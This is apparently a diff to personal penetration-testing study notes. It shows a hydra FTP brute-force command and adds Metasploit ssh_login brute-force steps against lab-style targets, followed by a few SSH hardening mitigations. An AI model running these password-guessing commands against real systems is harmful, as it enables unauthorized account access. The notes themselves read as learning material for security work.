@@ -128,3 +128,19 @@ pentesting ftp
     -bruteforce
       tool: hydra
         hydra -l admin -P pass.txt ftp://192.168.0.136 // he tried -I so look for this option
+
+Pentesting SSH
+  authentication:
+  -password based authentication
+  -key based authentication
+
+  bruteforce: username and password
+    metasploit
+    use auxiliary/scanner/ssh/ssh_login
+    show options
+    set RHOST // target address
+    set USERNAME msfadmin
+    set PASS_FILE pass.txt
+    mitigations: enforce ssh PROTOCOL 2, Disable Root Login, Alter the Default SSH Port
+
+Telnet
